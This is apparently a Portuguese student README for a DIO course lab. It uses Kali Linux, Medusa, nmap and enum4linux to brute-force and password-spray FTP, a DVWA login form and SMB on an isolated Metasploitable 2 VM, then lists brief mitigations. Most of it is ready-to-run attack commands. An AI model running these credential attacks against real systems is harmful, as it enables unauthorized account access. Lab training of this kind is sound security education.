# Projeto DIO — Força Bruta com Kali Linux + Medusa

**Autor:** Vitoria Gouveia
**Data:** 18/10/2025

---

## Resumo

Este repositório documenta a implementação prática do desafio da DIO: utilização do **Kali Linux** e da ferramenta **Medusa** em um ambiente controlado (Metasploitable 2 e DVWA) para simular ataques de força bruta em diferentes serviços (FTP, formulário web e SMB), validar acessos e propor medidas de mitigação.

---

## Ambiente e preparação

1. Instalei o **VirtualBox (Oracle)** e criei duas VMs:

   * **Kali Linux** (máquina atacante)
   * **Metasploitable 2** (máquina alvo)
2. Configurei a rede como **Host-only** para que as VMs se comuniquem entre si e fiquem isoladas da rede externa.
3. Iniciei ambas as máquinas e, no Kali, confirmei conectividade com a Metasploitable:

```bash
ping -c 3 192.168.56.101
```

4. Rodei uma varredura para checar portas:

```bash
nmap -sV -p 21,22,80,445,139 192.168.56.101
```

Resultado: as portas 21, 22, 80, 139 e 445 estavam abertas.

---

## 1) Força bruta em FTP

### Wordlists criadas para testes de força bruta

Usuários: `users.txt`:

```bash
echo -e "user\msfadmin\admin\root" > users.txt
```

Senhas: `pass.txt`:

```bash
echo -e "123456\password\qwerty\msfadmin" > pass.txt
```

### Comando Medusa para teste das possíveis credenciais:

```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
```

* Observei a saída do Medusa procurando por `SUCCESS` ou `FOUND` (indicando credenciais válidas).
* Validei o login manualmente via FTP:

```bash
ftp 192.168.56.101
```

Resultado: login via FTP confirmado com as credenciais encontradas.

---

## 2) Força bruta no formulário web (DVWA)

1. Acessei o DVWA na VM Kali em: `192.168.56.101/dvwa/login.php` e identifiquei os parâmetros do formulário (`username`, `password`).
2. Executei Medusa para automatizar as tentativas no formulário web usando as mesmas wordlists:

```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
  -m PAGE:'/dvwa/login.php' \
  -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
  -m 'FAIL=Login failed' -t 6
```

3. Verifiquei a saída procurando por `SUCCESS`/`FOUND` e testei manualmente a credencial encontrada no navegador.

Resultado: credencial válida e login confirmado no DVWA.

---

## 3) Password spraying em SMB com enumeração de usuários

### Enumeração

* Rodei enumeração com `enum4linux` e salvei a saída como "enum4_output.txt":

```bash
enum4linux -a 192.168.56.101 | tee enum4_output.txt
```

* Procurei na saída por possíveis nomes de usuários:

```bash
less enum4_output.txt
```

### Wordlists criadas

Usuários: `smb_users.txt`:

```bash
echo -e "user\msfadmin\service" > smb_users.txt
```

Senhas: `senhas_spray.txt`:
* Senhas mais comuns e possíveis para o caso.

```bash
echo -e "password\123456\Welcome123\msfadmin" > senhas_spray.txt
```

### Teste com Medusa (password spraying):

```bash
medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smb -T 6
```

### Validação

* Verifiquei mensagens de `SUCCESS`/`FOUND` na saída do Medusa e extraí as credenciais encontradas.
* Testei acesso SMB com `smbclient` usando as credenciais descobertas:

```bash
smbclient //192.168.56.101 -U msfadmin
```

Resultado: credenciais válidas encontradas e acesso concedido.

---

## O que aprendi

* Instalar e criar Máquinas Virtuais com Oracle VirtualBox;
* Como montar um laboratório isolado com VirtualBox e Host-only;
* Usar `nmap` para identificar portas/serviços;
* Criar wordlists simples (usuários e senhas) com `echo -e` para testes rápidos;
* Executar Medusa para brute-force em FTP, formularios HTTP (DVWA) e SMB;
* Realizar enumeração com `enum4linux` para password spraying;
* Validar credenciais manualmente (ftp, navegador, smbclient).

---

## Recomendações de mitigação

* Substituir FTP por SFTP/FTPS, uso de senha forte, CAPTCHA, lockout por tentativas repetidas, monitoramento.

